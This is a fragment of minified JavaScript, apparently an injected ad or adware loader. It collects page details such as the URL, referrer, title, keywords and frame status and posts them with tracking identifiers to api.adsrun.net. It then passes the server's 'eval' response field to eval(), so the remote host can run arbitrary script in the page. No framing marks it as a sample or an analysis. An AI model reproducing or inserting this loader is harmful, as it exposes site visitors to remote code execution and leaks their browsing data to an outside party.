...
g=[],f=0;f<c.length;f++)"keywords"==c[f].name.toLowerCase()&&g.push(c[f].content);req={width:m,height:e,frame:a!=a.top,location:b.location.toString(),referer:b.referrer,title:b.title,keywords:g.join(", "),loader:k};b.gotowf||(b.gotowf=!0,ajax(h,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(c){console.log(c)}}))})(window,document,"http://api.adsrun.net/post",{"name":"jqr1","time":1454744659.6622,"user":"1008735.1271874","subid":1008735,"geo":"PH","hash":"397e068a558e3e7c6bbc925d76c8c5d9"});
